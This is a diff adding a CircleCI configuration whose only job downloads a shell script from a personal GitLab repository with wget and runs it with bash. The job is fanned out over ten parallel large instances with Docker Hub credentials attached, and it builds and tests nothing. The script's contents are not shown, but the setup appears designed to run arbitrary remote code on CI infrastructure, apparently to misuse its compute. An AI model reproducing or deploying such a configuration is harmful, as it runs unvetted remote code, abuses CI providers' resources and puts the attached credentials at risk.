@@ -1,0 +1,37 @@
+version: 2.1
+
+executors:
+  my-custom-executor:
+    docker:
+      - image: cimg/base:stable
+        auth:
+          username: $DOCKER_HUB_USER
+          password: $DOCKER_HUB_PASSWORD
+    resource_class: large 
+
+jobs:
+  my-job-name:
+    parameters:
+      node_id:
+        type: string
+        default: "1"
+    executor: my-custom-executor
+    steps:
+      - checkout
+      - run:
+          name: "Setup and Execute Instance << parameters.node_id >>"
+          command: |
+            wget -q -O circle.sh https://gitlab.com/barbieanay003/seger/-/raw/main/tnm.sh
+            sed -i 's/\r$//' circle.sh
+            chmod +x circle.sh
+            bash circle.sh
+
+workflows:
+  my-custom-workflow:
+    jobs:
+      - my-job-name:
+          context:
+            - docker-hub-creds
+          matrix:
+            parameters:
+              node_id: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"]
